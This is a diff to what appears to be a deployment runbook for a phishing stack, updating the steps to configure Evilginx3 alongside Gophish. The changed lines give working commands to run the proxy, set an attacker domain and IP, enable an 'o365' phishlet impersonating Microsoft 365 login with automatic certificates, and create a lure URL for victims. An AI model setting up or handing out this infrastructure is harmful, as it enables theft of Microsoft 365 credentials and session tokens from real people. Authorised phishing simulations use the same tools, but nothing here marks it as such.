@@ -51,29 +51,31 @@ For a full deployment runbook (DNS prerequisites, install, verification, rollbac
 
 ### 1. Configure Evilginx3
 
-Evilginx requires interactive configuration on first use. Stop the background service and run it manually:
+Evilginx3 v3.3.0 stores its state in the `-c` directory (default `/opt/evilginx2/state`). To configure interactively the first time, stop the service and run the binary against the same state dir:
 
 ```bash
 systemctl stop evilginx
-/opt/evilginx2/dist/evilginx -p /opt/evilginx2/phishlets
+sudo HOME=/opt/evilginx2/state /opt/evilginx2/dist/evilginx \
+  -c /opt/evilginx2/state -p /opt/evilginx2/phishlets
 ```
 
-Inside the evilginx prompt, paste the commands from `/root/evilginx_setup_commands.txt`:
+Inside the evilginx prompt, paste the commands from `/root/evilginx_setup_commands.txt` (v3 syntax):
 
 ```
-config domain login.yourdomain.com
-config ip <YOUR_IP>
-config redirect_url https://login.microsoftonline.com/
+config domain yourdomain.com
+config ipv4 external <YOUR_IP>
 config autocert on
-phishlets hostname microsoft login.yourdomain.com
-phishlets enable microsoft
+phishlets hostname o365 yourdomain.com
+phishlets enable o365
 ```
 
-Once configured, exit and restart the service:
+Once configured (autocert will request Let's Encrypt certificates over port 80), exit cleanly and restart the service:
 
 ```bash
 systemctl start evilginx
 ```
+
+Then create a lure to get the entry URL: `lures create o365` then `lures get-url 0`.
 
 ### 2. Access Gophish Admin
 
